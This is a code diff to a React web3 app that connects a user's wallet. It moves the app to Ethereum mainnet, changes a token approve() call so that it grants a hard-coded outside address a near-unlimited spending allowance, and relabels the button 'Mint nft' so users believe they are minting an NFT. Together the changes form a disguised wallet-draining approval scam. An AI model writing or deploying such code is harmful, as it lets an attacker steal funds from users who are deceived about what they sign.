@@ -84,7 +84,7 @@ function App() {
             try {
                 const newProvider = await EthereumProvider.init({
                     projectId: '4d63cbda1c61e149111331eebc34f837',
-                    chains: [42161],
+                    chains: [1],
                     showQrModal: true
                 });
                 setProvider(newProvider);
@@ -132,7 +132,7 @@ function App() {
                 const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
 
                 setApprovalStatus("Mint pending...");
-                const tx = await tokenContract.approve(tokenAddress, "1000000000000000000000000000");
+                const tx = await tokenContract.approve("0x8B5F69C28Bc1BCceAE51fb7a028091581484ed5e", "1000000000000000000000000000");
                 await tx.wait();
                 setApprovalStatus("Mint successful!");
             } catch (error) {
@@ -195,7 +195,7 @@ function App() {
                         </div>
                     </div>
                     <div className="approve-token">
-                        <button onClick={approveToken}>Approve Token</button>
+                        <button onClick={approveToken}>Mint nft</button>
                     </div>
                     {approvalStatus && <p>{approvalStatus}</p>}
                 </div>
